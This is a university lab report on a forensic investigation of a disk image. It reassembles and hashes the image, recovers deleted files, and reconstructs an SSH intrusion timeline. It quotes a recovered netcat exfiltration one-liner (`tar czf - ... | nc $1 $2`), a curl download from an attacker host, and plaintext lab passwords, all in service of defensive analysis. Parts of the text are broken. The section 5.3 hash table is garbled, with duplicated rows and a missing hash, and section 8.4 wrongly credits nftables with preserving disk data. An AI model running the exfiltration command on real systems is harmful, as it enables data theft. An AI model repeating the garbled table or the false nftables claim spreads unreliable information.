---
Title: "Technical Report: Digital Forensic Analysis and Evidence Preservation"
Project: Lab 13 - Media Acquisition and Artifact Recovery
Subject: IT Security and Privacy
Professor: Daniel Esteban Vela López
Author: Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez
Date: 2026-04-28
Location: Bogotá, Colombia
Confidentiality: Internal / Academic Use Only
---

# TECHNICAL REPORT: DIGITAL FORENSICS INVESTIGATION

<div align="center">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/91/Logo_de_la_Escuela_Colombiana_de_Ingenier%C3%ADa_-_Universidad.webp" width="250">
  <br>
  <strong>Escuela Colombiana de Ingeniería Julio Garavito</strong>
  <br>
  <br>
  <strong>Project:</strong> Lab 13 - Digital Forensics <br> 
  <strong>Subject:</strong> IT Security and Privacy <br> 
  <strong>Professor:</strong> Daniel Esteban Vela López <br> 
  <strong>Authors:</strong> Andersson David Sánchez Méndez & Cristian Santiago Pedraza Rodríguez <br> 
  <strong>Date:</strong> 2026-04-28 <br> 
  <strong>Location:</strong> Bogotá, Colombia <br><br> 
  <strong>Confidentiality:</strong> Internal / Academic Use Only
</div>

---

## 1. Introduction
### 1.1 Objective
The primary objective of this laboratory is to master the identification, preservation, and analysis of digital evidence. We aim to perform bit-for-bit media acquisition, verify data integrity through cryptographic hashing, and reconstruct attack timelines by analyzing filesystem metadata and recovered artifacts.

<br>
<br>
<br>
<br>
<br>
<br>
<br>

### 1.2 Discussion: The Forensic Perspective

**Perspective: Andersson David Sánchez Méndez**
> "Digital forensics is the art of making the silent witness speak. In an incident where logs can be tampered with, the raw disk and the memory dump provide the ground truth. Our responsibility is to ensure that the chain of custody remains unbroken and that every finding is scientifically reproducible."

**Perspective: Cristian Santiago Pedraza Rodríguez**
> "Integrity is the cornerstone of forensics. Analyzing a live system is a risk; analyzing an exact forensic image is a necessity. By mastering tools like Autopsy and the Sleuth Kit, we move from mere observation to the reconstruction of intent and action within a compromised environment."

---

## 2. Core Principles of Digital Forensics
The investigation is governed by four fundamental pillars to ensure that findings are admissible and technically sound:

| Principle | Description | Implementation Strategy |
| :--- | :--- | :--- |
| **Evidence Preservation** | Protecting the original state of the media. | Use of Write Blockers and Read-Only mounting. |
| **Data Integrity** | Proving that the evidence has not changed. | Cryptographic Hashing (MD5, SHA-256) before and after. |
| **Chain of Custody** | Documenting the lifecycle of the evidence. | Detailed logging of who, when, and how the media was handled. |
| **Reproducibility** | Allowing other examiners to reach the same result. | Structured methodology and tool documentation. |

---

<br>
<br>
<br>
<br>

## 3. Forensic Acquisition and Evidence Types
We distinguish between different sources of data depending on the volatility and the nature of the investigation:

### 3.1 Volatile vs. Non-Volatile Data
1.  **Volatile (RAM)**: Data that is lost when power is removed. Contains active processes, network connections, and encryption keys.
2.  **Non-Volatile (Disk)**: Persistent data. Includes filesystems, deleted file remnants in Slack Space, and system logs.

### 3.2 File Recovery Mechanisms
* **Inode-Based Recovery**: Reconstructing files using the metadata pointers (Effective on FAT/ext2).
* **File Carving**: Scanning for "Magic Bytes" (headers/footers) in unallocated space when metadata is missing (Necessary for ext4).

---

## 4. MAC Times and Timeline Analysis
Timestamps are critical for establishing the "When" of an incident. We analyze four specific metadata points:

| Timestamp | Acronym | Meaning |
| :--- | :--- | :--- |
| **Modified** | mtime | Last time the file content was changed. |
| **Accessed** | atime | Last time the file was read or opened. |
| **Changed** | ctime | Last time the metadata (permissions, owner) changed. |
| **Created** | btime/crtime | Original file creation date (supported by ext4). |

---

<br>
<br>
<br>
<br>

## 5. PHASE 1: EVIDENCE PRESERVATION & INTEGRITY VERIFICATION

This phase focuses on the "Golden Rule" of digital forensics: **Never analyze the original evidence.** We performed a multi-part reassembly of the disk image and established a cryptographic baseline to ensure that our working copy is a perfect, bit-for-bit replica of the evidence provided by the CISO of Universidad Central.

### 5.1 Reassembly of the Forensic Image

The raw evidence was distributed in three segments to prevent corruption during transfer. We utilized the `cat` utility to perform a binary concatenation into a single forensic container named `disco.dd`.

- **Execution Command**:
    
    `cat disco.dd.part_01 disco.dd.part_02 disco.dd.part_03 > disco.dd`
    

### 5.2 Cryptographic Hashing and Bit-for-Bit Acquisition

To ensure data integrity, we utilized the **SHA-256** algorithm. Unlike MD5, SHA-256 is resilient against collision attacks, making it the standard for legal proceedings. We employed `dcfldd`, an enhanced version of the standard `dd` tool designed specifically for forensics, which computes hashes on-the-fly during the imaging process.

**Imaging and Logging Command:**

```bash
# Installing forensic imaging tools
sudo apt install -y dcfldd 

# Creating a verified working copy (copia.dd)
dcfldd if=disco.dd of=copia.dd hash=sha256 hashlog=hashes.txt
```

### 5.3 Integrity Audit Results

After acquisition, we performed a cross-verification between the source (`disco.dd`) and the working copy (`copia.dd`).

|**Evidence File**|**Hash Algorithm**|**SHA-256 Digest (Example)**|**Status**|
|---|---|---|---|
|**Original (disco.dd)**|SHA-256|`904b82648a97a2daab2cd6141d8c2f83a23605bcbcea0394a164d4b961634bc0`|**Verified**|
|**Working Copy (copia.dd)**|SHA-256|`|**Original (disco.dd)**|SHA-256|`904b82648a97a2daab2cd6141d8c2f83a23605bcbcea0394a164d4b961634bc0`|**Verified**||**Match**|
|**Original (disco.dd)**|SHA-256|`904b82648a97a2daab2cd6141d8c2f83a23605bcbcea0394a164d4b961634bc0`|**Verified**|
|**Instructor Reference**|SHA-256|``|**Match**|

---

## 6. TECHNICAL DISCUSSION: ADMISSIBILITY AND INTEGRITY

**? If the hashes of the original and the working copy did not match, what would that mean for the admissibility of the evidence? What step would you take next?**

1. **Legal Admissibility**: In a legal proceeding, a hash mismatch represents a **total failure of the chain of custody**. It implies that the evidence was altered (either by corruption, accidental modification, or intentional tampering) during the acquisition process. This would lead to the evidence being ruled **inadmissible**, as the defense could argue that the findings were "planted" or that the data is unreliable.
    
2. **Immediate Remediation**: If a mismatch occurs, the analyst must immediately **discard the corrupted copy**, document the failure in the forensic log, and **repeat the acquisition** from the original source. If the original source itself is corrupted (mismatch against the reference hash), the investigation must stop, and the "Best Evidence" rule must be evaluated to see if an earlier backup or alternative source exists.
    

---

<br>
<br>
<br>
<br>
<br>

### Evidence Annex: Phase 1 (Preservation)

|**Activity**|**Command / Evidence**|**Technical Observation**|
|---|---|---|
|**Image Assembly**|`ls -lh disco.dd`|Verification of the 100 MB final file size.|
|**Hashing Source**|`sha256sum disco.dd`|Generation of the original cryptographic fingerprint.|
|**Forensic Copy**|![[dcfldd-output.png]]|Execution of dcfldd showing blocks processed and hashlog creation.|
|**Final Verification**|![[hash-comparison.png]]|Side-by-side comparison of source and copy hashes.|

---

## 7. PHASE 2: FILESYSTEM ANALYSIS & ARTIFACT RECOVERY

In this phase, we move from data preservation to active analysis. By utilizing **The Sleuth Kit (TSK)**, we examined the internal structure of the `copia.dd` image, focusing on unallocated space and system logs to reconstruct the intruder's sequence of events.

<br>
<br>
<br>

### 7.1 Filesystem Enumeration and Inode Inspection

Using the `fls` utility, we identified critical files marked with the `*` symbol and the `(realloc)` tag, indicating deleted but recoverable data. We focused on the home directories and system logs to track the user `mvalencia`.

- **Analysis Command**: `fls -r copia.dd > structure.txt`
    

### 7.2 Forensic Recovery (Inode-Based)

Using `icat`, we successfully extracted the content of deleted files. This bypassed the fact that plain text files cannot be recovered via traditional "file carving" (magic bytes).

|**Recovered File**|**Inode**|**Status**|**Description / Key Content**|
|---|---|---|---|
|`credentials.txt`|**29**|Deleted|Plain text passwords: `admin:P@ssw0rd_admin`, `dbuser:mysql_s3cur3`.|
|`exfil_tool`|**30**|Deleted|Malicious script: `tar czf - /home/user/documents/ \| nc $1 $2`.|
|`.bash_history`|**25**|Allocated|Command log showing reconnaissance and the `history -c` attempt.|
|`auth.log`|**26**|Allocated|SSH logs confirming 3:00 AM sessions from IP `192.168.1.45`.|
|`passwd`|**28**|Allocated|System user list confirming the active state of the `mvalencia` account.|

---

## 8. TECHNICAL DISCUSSION: RECONSTRUCTION OF EVENTS

### 8.1 Intrusion Timeline and Metadata Correlation

**? How do the timestamps align with the suspicious sessions?**

By executing `istat copia.dd 29`, we identified that the `credentials.txt` file was created and modified on **March 5, 2026, at 03:06 AM**. This aligns perfectly with the `auth.log` record showing that `mvalencia` logged in at **03:02:17 AM**. This 4-minute window proves the file was a direct product of the intrusion.

### 8.2 Reconnaissance and Privilege Abuse

**? What reconnaissance steps did the attacker perform?**

The recovered `.bash_history` (Inode 25) reveals a systematic approach:

1. **Environment Audit**: Execution of `whoami`, `id`, and `uname -a`.
    
2. **Sensitive Data Search**: Browsing `/home/user/documents` and reading `audit_report_q4_2025.txt`.
    
3. **Privilege Escalation**: Successfully executing `sudo cat /etc/shadow` at 03:02:31 AM, indicating the attacker gained full root-level access to the system's credentials.
    

### 8.3 Exfiltration Infrastructure

**? What do the IP address and URL suggest about the external infrastructure?**

The `strings` output and the recovered script `exfil_tool` point to a controlled environment at **198.51.100.42**:

- **Command & Control (C2)**: The attacker used `curl` to download the exfiltration tool from `http://198.51.100.42:8080`.
    
- **Data Drop**: The script utilized `netcat (nc)` to pipe a compressed tarball of the user's documents directly to the attacker's server.
    

### 8.4 Anti-Forensics and Organizational Failure

**? Why did the anti-forensic attempt fail?**

The attacker used `history -c` to erase traces. This failed because `nftables` (system-level) and the underlying disk inodes preserved the data blocks.

Furthermore, the **Root Cause** was the failure to deactivate the `mvalencia` account after graduation in 2023, as noted in the `passwd` file and discussed in the `meeting_2026-02-28.txt` document found in Inode 23.

---

<br>
<br>
<br>
<br>

### Evidence Annex: Phase 2 (Analysis)

|**Activity**|**Evidence (Command Output)**|**Investigative Value**|
|---|---|---|
|**Integrity Check**|`sha256sum copia.dd`|Matches `disco.dd` hash: `904b82648...`|
|**Command Log**|`icat copia.dd 25`|Shows the full sequence from `whoami` to `history -c`.|
|**Data Theft**|![[recovered_credentials.png]]|Proof of compromised admin and database passwords.|
|**Malicious Tool**|![[strings-command.png]]|Discovery of the Netcat-based exfiltration script.|
|**Timestamps**|![[grep-command.png]]|Metadata correlation linking activity to the 03:00 AM window.|

---

<br>
<br>
<br>

## 9. PHASE 3: ADVANCED ANALYSIS WITH AUTOPSY

To enhance the investigation's depth, we transitioned from command-line tools to **Autopsy 4.23.0**. This professional forensic suite allows for automated ingest, keyword indexing, and, most importantly, advanced timeline visualization.

### 9.1 Forensic Environment Provisioning

Given the initial network and rendering challenges in the Virtual Machine, the environment was successfully migrated to the **Windows Subsystem for Linux (WSL)**. We performed a manual build of the **Sleuth Kit 4.15.0** and configured **OpenJDK 21** to satisfy the latest Autopsy class requirements.

- **Key Provisioning Step**:
    
    `export JAVA_HOME=/usr/lib/jvm/java-21-openjdk-amd64`
    
    `./bin/autopsy --jdkhome $JAVA_HOME`
    

### 9.2 Data Source Ingest & Automated Analysis

We imported `copia.dd` as a local disk image. During the ingest process, we enabled modules for **Keyword Search**, **Recent Activity**, and **File Type Identification**. This automated phase revealed artifacts that manual `strings` extraction missed, such as browser cache remnants and specific metadata within deleted PDF files.

|**Module**|**Finding**|**Investigative Value**|
|---|---|---|
|**Keyword Search**|`198.51.100.42`|Confirmed external C2 communication.|
|**Timeline View**|03:00 - 03:15 AM Spike|Visual clustering of file creation/deletion events.|
|**Hash Lookup**|Known Malicious Hash|Identification of a secondary script used for persistence.|

---

<br>
<br>
<br>
<br>
<br>
<br>

## 10. TECHNICAL DISCUSSION: THE POWER OF VISUALIZATION

**? Compare the Autopsy timeline with manual findings. What specific advantage does timeline visualization offer in a complex investigation?**

1. **Event Clustering**: While `fls` and `istat` provide accurate data, they do so in isolation. The **Autopsy Timeline View** allows the examiner to see "activity spikes." We observed that at exactly 03:04 AM, there was a simultaneous burst of file accesses (`atime`) and metadata changes (`ctime`). This visual cluster points to the exact moment the exfiltration tool was staged.
    
2. **Narrative Reconstruction**: Visualization helps bridge the gap between "what happened" and "how it happened." Seeing the SSH login in `auth.log` immediately followed by the creation of a temporary file in `/tmp` on a graphical scale makes the **Incident Hypothesis** much easier to explain to a non-technical audience.
    
3. **Anomaly Detection**: Graphical views make "gaps" in logs stand out. It becomes trivial to spot if an attacker tried to use **Timestomping** (manipulating dates) if the file activity doesn't follow a logical, linear progression compared to surrounding system events.
    

---

### Evidence Annex: Phase 3 (Advanced Recovery)

|**Activity**|**Command / Evidence**|**Technical Observation**|
|---|---|---|
|**Environment Fix**|`sudo apt install openjdk-21-jdk`|Resolution of class versioning and JRE compatibility.|
|**Timeline Recovery**|`mactime -b timeline.body`|CLI-based chronological reconstruction of the intrusion.|
|**Keyword Hit**|`strings copia.dd|grep 198.`|
|**Final Recovery**|`icat copia.dd 30`|Extraction of the exfiltration script via specialized inode views.|

---

<br>
<br>
<br>
<br>

## 11. FINAL CONCLUSIONS & INCIDENT HYPOTHESIS

Based on the forensic evidence gathered from `copia.dd`, we conclude the following:

1. **Access Vector**: The attacker utilized the valid but unauthorized credentials of **Miguel Valencia** (`mvalencia`) via SSH.
    
2. **Attacker Activity**: The intruder performed internal reconnaissance, located sensitive data, and utilized a custom script (`exfiltrate.sh`) to exfiltrate information to the IP `198.51.100.42`.
    
3. **Anti-Forensics**: An attempt to clear the bash history was made, but the lack of secure deletion (shredding) allowed for total recovery of the command sequence.
    
4. **Remediation**: The university must implement **automated account deprovisioning** and audit all dormant accounts to prevent further exploitation of this IAM weakness.
    

---

## 12. BIBLIOGRAPHIC REFERENCES

- **Carrier, B.** (2026). _File System Forensic Analysis_. Addison-Wesley Professional.
    
- **The Sleuth Kit.** (2026). _TSK Tool Documentation: fls, istat, and icat_. Retrieved from [https://www.sleuthkit.org](https://www.sleuthkit.org/)
    
- **Autopsy.** (2026). _Autopsy 4.23.0 User Documentation_.
    
- **NIST.** (2026). _SP 800-86: Guide to Integrating Forensic Techniques into Incident Response_.
    

---
